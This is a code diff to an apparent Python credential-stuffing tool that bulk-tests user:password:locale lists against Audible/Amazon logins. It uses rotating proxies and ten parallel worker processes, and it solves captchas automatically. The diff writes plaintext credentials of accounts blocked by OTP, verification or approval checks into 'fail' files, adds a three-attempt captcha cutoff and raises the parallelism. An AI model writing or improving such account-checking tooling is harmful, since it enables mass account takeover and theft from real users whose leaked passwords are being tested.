@@ -560,7 +560,7 @@ class Spider():
 async def getinfo(auth,locale,account,proxys,userAgent):
     async with audible.AsyncClient(auth) as client:
         # print(repr(client))
-        print(111111111)
+     
         with httpx.Client(cookies=auth.website_cookies) as session:
             scheme, netloc, path, _, _, _ = urlparse(REGIONS_URLS[locale])
             url = 'https://'+netloc+'/'
@@ -611,28 +611,32 @@ def custom_otp_callback(userinfo: str):
     print('custom_otp_callback')
     # Do some things to insert otp code
     with open('fail/otpuserinfo.txt', 'a+', encoding='utf-8') as f:
-        f.write(userinfo)
-                  
+        f.write(LOGINCOUNT[userinfo]['userinfo'])
+        return False          
     return "My answer for otp code"
 def custom_cvf_callback(userinfo: str):
 
     # Do some things to insert cvf code
     with open('fail/cvfuserinfo.txt', 'a+', encoding='utf-8') as f:
-        f.write(userinfo)
+        f.write(LOGINCOUNT[userinfo]['userinfo'])
+        return False
     return "My answer for cvf code"
 def custom_approval_callback(userinfo: str):
     with open('fail/approvaluserinfo.txt', 'a+', encoding='utf-8') as f:
-        f.write(userinfo)
+        f.write(LOGINCOUNT[userinfo]['userinfo'])
+        return False
     return "My answer for callback"
 
 def custom_captcha_callback(captcha_url: str,userinfo: str) -> str:
     # return False
     """Opens captcha image with eog, or default webbrowser as fallback"""
     
-    LOGINCOUNT[userinfo] += 1
+    LOGINCOUNT[userinfo]['count'] += 1
 
-    if int(LOGINCOUNT[userinfo]) > 3:
-        return True
+    if int(LOGINCOUNT[userinfo]['count']) >= 3:
+        with open('fail/outcount.txt', 'a+', encoding='utf-8') as f:
+            f.write(LOGINCOUNT[userinfo]['userinfo'])
+        return False
     # print(LOGINCOUNT)
     # src = cv.imread(captcha_url)
     start = time.time()
@@ -646,7 +650,9 @@ def custom_captcha_callback(captcha_url: str,userinfo: str) -> str:
 def authlogin(locale,user,password,myproxy,userAgent):
     myproxy="http://"+myproxy
     print(myproxy)
-    LOGINCOUNT[user] = 0
+    LOGINCOUNT[user] = {}
+    LOGINCOUNT[user]['count'] = 0
+    LOGINCOUNT[user]['userinfo'] = user + ':' + password + ':'+ locale + "\n"
     auth = Authenticator.from_login(
         username=user,
         proxys=myproxy,
@@ -656,7 +662,7 @@ def authlogin(locale,user,password,myproxy,userAgent):
         captcha_callback=custom_captcha_callback,
         otp_callback=None,
         cvf_callback=None,
-        approval_callback=None
+        approval_callback=custom_approval_callback
     )
     # custom_captcha_callback
     sem = asyncio.Semaphore(10)
@@ -699,6 +705,7 @@ def asyncamzon(index):
             try:
                 if i % 10 == index:
                     proxy_ip = None
+                    print("This is the "+ str(i)+" number of data")
                     while True:
                         proxy_ip = get_ip()
                     
@@ -717,7 +724,7 @@ def asyncamzon(index):
                         except:
                             print("IP:", proxy_ip, "无效")
                             time.sleep(1)
-                    userinfo = line.split('|')
+                    userinfo = line.split(':')
                     user = userinfo[0]
                     password = userinfo[1]
                     locale = userinfo[2].replace('\n', '')
@@ -740,7 +747,7 @@ if __name__ == "__main__":
     signal.signal(signal.SIGINT, quit)                                
     signal.signal(signal.SIGTERM, quit)
     
-    p = Pool(4)
+    p = Pool(10)
     for i in range(5):
         p.apply_async(asyncamzon, args=(i,))
    
